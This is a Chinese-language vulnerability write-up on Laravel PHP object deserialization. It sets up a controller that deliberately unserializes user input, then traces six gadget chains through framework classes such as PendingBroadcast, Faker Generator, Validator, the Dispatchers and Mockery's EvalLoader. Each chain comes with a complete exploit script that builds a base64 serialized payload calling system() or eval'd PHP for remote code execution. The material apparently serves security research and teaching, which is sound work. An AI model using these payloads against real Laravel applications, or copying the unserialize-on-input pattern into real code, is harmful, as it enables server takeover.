# 环境搭建

> 在 `routes/web.php` 中添加路由

```php
Route::get('/', "DemoController@demo");
```

> 在 `app/Http/Controllers` 目录下添加控制器

```php
<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
class DemoController extends Controller
{
    public function demo()
    {
        if(isset($_GET['data'])){
            @unserialize(base64_decode($_GET['data']));
        }
        else{
            highlight_file(__FILE__);
        }
    }
}
```

# 漏洞分析
> 先寻找一下反序列化漏洞的触发点，全局搜索 `__destruct()` 方法或者 `__wakeup()` 方法

<img src="./images/1.png" alt="">

<img src="./images/2.png" alt="">

## POC链-1
> 跟进 `src/Illuminate/Broadcasting/PendingBroadcast.php` 中的 `__destruct()` 方法，发现 `$this->events` 和 `$this->event` 都是可控的，因此可以寻找一个 `__call()` 方法或者 `dispatch()` 方法来进行利用
> 先用 `__call()` 来做突破点，跟进 `src/Faker/Generator.php` 中的 `__call()` 方法，发现其调用了 `format()` 方法，进而调用 `getFormatter()` 方法

<img src="./images/poc-1-2.png" alt="">

> 由于 `getFormatter()` 方法中的 `$this->formatters[$formatter]` 是可控的并直接 return 回上一层，因此可以利用该可控参数来进行命令执行 RCE 操作

### exp
```php
<?php
namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;
        function __construct($events="", $event="") {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct($func="") {
            $this->formatters = ['dispatch' => $func];
        }
    }
}

namespace {
    $demo1 =  new Faker\Generator("system");
    $demo2 = new Illuminate\Broadcasting\PendingBroadcast($demo1, "calc");
    echo base64_encode(serialize($demo2));
}
?>
```

<img src="./images/poc-1-3.png" alt="">

### POC链利用流程图

<img src="./images/poc-1-4.png" alt="">

## POC链-2
> 继续上面寻找可用的 `__call()` 方法，跟进 `src/Illuminate/Validation/Validator.php` 中的 `__call()` 方法，先进行字符串的操作截取 `$method` 第八个字符之后的字符，由于传入的字符串是 `dispatch`，正好八个字符所以传入后为空，接着经过 if 逻辑调用 `callExtension()` 方法，触发 `call_user_func_array` 方法

<img src="./images/poc-2-1.png" alt="">

### exp
```php
<?php
namespace Illuminate\Validation {
    class Validator {
       public $extensions = [];
       public function __construct() {
            $this->extensions = ['' => 'system'];
       }
    }
}

namespace Illuminate\Broadcasting {
    use  Illuminate\Validation\Validator;
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($cmd)
        {
            $this->events = new Validator();
            $this->event = $cmd;
        }
    }
    echo base64_encode(serialize(new PendingBroadcast('calc')));
}
?>
```


### POC链利用流程图
<img src="./images/poc-2-2.png" alt="">

## POC链-3
> 跟进 `src/Illuminate/Support/Manager.php` 中的 `__call()` 方法，其调用 `driver()` 方法

<img src="./images/poc-3-1.png" alt="">

> 跟进 `createDriver()` 方法，当 `$this->customCreators[$driver]` 存在时调用 `callCustomCreator()` 方法，进一步跟进 `callCustomCreator()` 方法，发现 `$this->customCreators[$driver]` 和 `$this->app)` 均是可控的，因此可以触发 RCE

<img src="./images/poc-3-2.png" alt="">

### exp
```php
<?php
namespace Illuminate\Notifications {
    class ChannelManager {
        protected $app;
        protected $customCreators;
        protected $defaultChannel;
        public function __construct() {
            $this->app = 'calc';
            $this->defaultChannel = 'H3rmesk1t';
            $this->customCreators = ['H3rmesk1t' => 'system'];
        }
    }
}


namespace Illuminate\Broadcasting {
    use  Illuminate\Notifications\ChannelManager;
    class PendingBroadcast {
        protected $events;
        public function __construct()
        {
            $this->events = new ChannelManager();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```

<img src="./images/poc-3-3.png" alt="">

### POC链利用流程图

<img src="./images/poc-3-4.png" alt="">

## POC链-4
> 大致看了一遍 `__call()` 方法基本没有利用的地方了(太菜了找不到)，开始跟一下 `dispath()` 方法

<img src="./images/poc-1-1.png" alt="">

> 先跟进 `src/Illuminate/Events/Dispatcher.php` 中的 `dispatch()` 方法，注意到 `$listener($event, $payload)`，尝试以这个为突破口来实现 RCE

<img src="./images/poc-4-1.png" alt="">

> 看看 `$listener` 的值是如何来的，跟进 `getListeners()` 方法，这里可以先通过可控变量 `$this->listeners[$eventName]` 来控制 `$listener` 的值，接着进入数组合并函数，调用 `getWildcardListeners()` 方法，跟进去看一下，这里保持默认设置执行完之后会返回 `$wildcards = []`，接着回到数组合并函数合并之后还是 `$this->listeners[$eventName]` 的值，接着进入 `class_exists()` 函数，这里由于并不会存在一个命令执行函数的类名，因此可以依旧还是返回 `$this->listeners[$eventName]` 的值

<img src="./images/poc-4-2.png" alt="">

> 控制了 `$listener` 的取值之后，将传入的 `$event` 的值作为命令执行函数的参数值即可来进行 RCE 操作

### exp
```php
<?php
namespace Illuminate\Events {
    class Dispatcher {
        protected $listeners = [];
        public function __construct() {
            $this->listeners = ["calc" => ["system"]];
        }
    }
}



namespace Illuminate\Broadcasting {
    use  Illuminate\Events\Dispatcher;
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = "calc";
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```

<img src="./images/poc-4-3.png" alt="">

### POC链利用流程图

<img src="./images/poc-4-4.png" alt="">

## POC链-5
> 继续跟 `dispatch()` 方法，跟进 `src/Illuminate/Bus/Dispatcher.php` 中的 `dispatch()` 方法，注意到该方法如果 if 语句判断为 true 的话，会进入 `dispatchToQueue()` 方法，跟进 `dispatchToQueue()` 方法发现 `call_user_func()` 方法

<img src="./images/poc-5-1.png" alt="">

> 先看看怎么使得进入 if 语句的循环中，首先 `$this->queueResolver` 是可控的，跟进 `commandShouldBeQueued()` 方法，这里判断 `$command` 是否是 `ShouldQueue` 的实现，即传入的 `$command` 必须是 `ShouldQueue` 接口的一个实现，而且 `$command` 类中包含 `connection` 属性

<img src="./images/poc-5-2.png" alt="">

> 这里找到两个符合条件的类 `src/Illuminate/Notifications/SendQueuedNotifications.php` 中的 `SendQueuedNotifications` 类和 `src/Illuminate/Broadcasting/BroadcastEvent.php` 中的 `BroadcastEvent` 类，当类是 use 了 trait 类，同样可以访问其属性，这里跟进 `src/Illuminate/Bus/Queueable.php`

<img src="./images/poc-5-3.png" alt="">

<img src="./images/poc-5-4.png" alt="">

<img src="./images/poc-5-5.png" alt="">

### exp
```php
<?php
namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver = "system";
    }
}

namespace Illuminate\Broadcasting {
    use  Illuminate\Bus\Dispatcher;
    class BroadcastEvent {
        public $connection;
        public $event;
        public function __construct() {
            $this->event = "calc";
            $this->connection = $this->event;
        }
    }



    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = new BroadcastEvent();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```

<img src="./images/poc-5-6.png" alt="">

### POC链利用流程图

<img src="./images/poc-5-7.png" alt="">

## POC链-6
> 继续接着上一条链子的 `call_user_func()` 方法往后，由于这里变量是可控的，因此可以调用任意类的方法，跟进 `library/Mockery/Loader/EvalLoader.php` 中的 `load()` 方法，这里如果不进入 if 循环从而触发到 `getCode()` 方法即可造成任意代码执行漏洞

<img src="./images/poc-6-1.png" alt="">

> 看看 if 循环的判断条件，一路跟进调用，由于最后的 `$this->name` 是可控的，因此只需要给它赋一个不存在的类名值即可，可利用的 `getName()` 方法比较多，选一个能用的就行

<img src="./images/poc-6-2.png" alt="">

<img src="./images/poc-6-3.png" alt="">

### exp-1
```php
<?php
namespace Mockery\Generator {
    class MockConfiguration {
        protected $name = 'H3rmesk1t';
    }
    class MockDefinition {
        protected $config;
        protected $code;
        public function __construct() {
            $this->config = new MockConfiguration();
            $this->code = "<?php system('calc');?>";
        }
    }
}

namespace Mockery\Loader {
    class EvalLoader {}
}

namespace Illuminate\Bus {
    use Mockery\Loader\EvalLoader;
    class Dispatcher {
        protected $queueResolver;
        public function __construct() {
            $this->queueResolver = [new EvalLoader(), 'load'];
        }
    }
}

namespace Illuminate\Broadcasting {
    use Illuminate\Bus\Dispatcher;
    use Mockery\Generator\MockDefinition;
    class BroadcastEvent {
        public $connection;
        public function __construct() {
            $this->connection = new MockDefinition();
        }
    }
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = new BroadcastEvent();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```

### exp-2
```php
<?php
namespace Symfony\Component\HttpFoundation {
    class Cookie {
        protected $name = "H3rmesk1t";
    }
}

namespace Mockery\Generator {
    use Symfony\Component\HttpFoundation\Cookie;
    class MockDefinition {
        protected $config;
        protected $code;
        public function __construct($code) {
            $this->config = new Cookie();
            $this->code = $code;
        }
    }
}

namespace Mockery\Loader {
    class EvalLoader {}
}

namespace Illuminate\Bus {
    use Mockery\Loader\EvalLoader;
    class Dispatcher {
        protected $queueResolver;
        public function __construct() {
            $this->queueResolver = [new EvalLoader(), 'load'];
        }
    }
}

namespace Illuminate\Broadcasting {
    use Illuminate\Bus\Dispatcher;
    use Mockery\Generator\MockDefinition;
    class BroadcastEvent {
        public $connection;
        public function __construct() {
            $this->connection = new MockDefinition("<?php system('calc');?>");
        }
    }
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = new BroadcastEvent();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```

<img src="./images/poc-6-4.png" alt="">

### POC链利用流程图

<img src="./images/poc-6-5.png" alt="">